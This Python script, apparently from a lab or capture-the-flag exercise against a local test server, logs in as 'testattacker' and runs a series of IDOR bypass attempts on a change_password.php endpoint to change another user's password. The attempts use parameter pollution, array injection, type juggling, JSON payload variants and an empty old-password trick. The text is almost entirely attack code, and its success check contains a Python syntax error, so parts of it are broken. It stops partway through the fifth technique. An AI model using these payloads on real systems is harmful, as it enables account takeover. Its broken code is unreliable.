import requests
import json
import re

base_url = "http://127.0.0.1:32973"
session = requests.Session()

print("STEP 1: LOGIN AS TESTATTACKER")
print("-" * 50)

login_resp = session.post(f"{base_url}/api/login.php", data={"username": "testattacker", "password": "hacker123!"})
print(f"Response: {login_resp.text}")
print(f"Cookies: {session.cookies.get_dict()}")

set_cookie = login_resp.headers.get('Set-Cookie', '')
print(f"Set-Cookie: {set_cookie}")

phpsessid_match = re.search(r'PHPSESSID=([^;]+)', set_cookie)
if phpsessid_match:
    phpsessid = phpsessid_match.group(1)
else:
    phpsessid = session.cookies.get('PHPSESSID')
print(f"PHPSESSID: {phpsessid}")

headers = {
    "Cookie": f"PHPSESSID={phpsessid}" if phpsessid else "",
    "Content-Type": "application/x-www-form-urlencoded"
}

print("\nSTEP 2: IDOR BYPASS TECHNIQUES")
print("=" * 50)

# Helper function to check success
def check_success(resp_text, msg):
    if "success":true in resp_text.lower():
        print(f"[!] SUCCESS - {msg}")
        return True
    return False

# Technique 1: Parameter pollution
print("\n[TECHNIQUE 1] Parameter Pollution - userId=7 then userId=17")
pollution_body = "userId=7&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=17"
poll_resp = session.post(f"{base_url}/api/change_password.php", data=pollution_body, headers=headers)
print(f"Response: {poll_resp.text}")
check_success(poll_resp.text, "Parameter pollution worked!")

# Technique 1b: Reverse order
print("\n[TECHNIQUE 1b] Parameter Pollution - Reverse order")
pollution_body2 = "userId=17&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=7"
poll_resp2 = session.post(f"{base_url}/api/change_password.php", data=pollution_body2, headers=headers)
print(f"Response: {poll_resp2.text}")
check_success(poll_resp2.text, "Reverse parameter pollution worked!")

# Technique 2: Array injection on userId
print("\n[TECHNIQUE 2] Array Injection on userId")
array_body = "userId[]=7&userId[]=17&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!"
array_resp = session.post(f"{base_url}/api/change_password.php", data=array_body, headers=headers)
print(f"Response: {array_resp.text}")
check_success(array_resp.text, "Array injection worked!")

# Technique 3: Type juggling with string userId
print("\n[TECHNIQUE 3] Type Juggling (userId as string)")
juggle_resp = session.post(f"{base_url}/api/change_password.php",
    data={"userId": "7", "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    headers=headers)
print(f"Response: {juggle_resp.text}")
check_success(juggle_resp.text, "Type juggling worked!")

# Technique 4: JSON Content-Type payloads
print("\n[TECHNIQUE 4] JSON Content-Type payloads")
json_headers = headers.copy()
json_headers["Content-Type"] = "application/json"

json_payloads = [
    {"userId": 7, "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": "7", "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": [7, 17], "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
]

for i, payload in enumerate(json_payloads, 1):
    resp = session.post(f"{base_url}/api/change_password.php", json=payload, headers=json_headers)
    print(f"JSON variant {i}: {resp.text}")
    check_success(resp.text, f"JSON variant {i} worked!")

# Technique 5: oldPassword bypass attempts
print("\n[TECHNIQUE 5] oldPassword bypass attempts")

# Empty oldPassword
empty_resp = session.post(f"{base_url}/api/change_password.php",
    data={"userId": 7, "oldPassword": "", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    headers=headers)
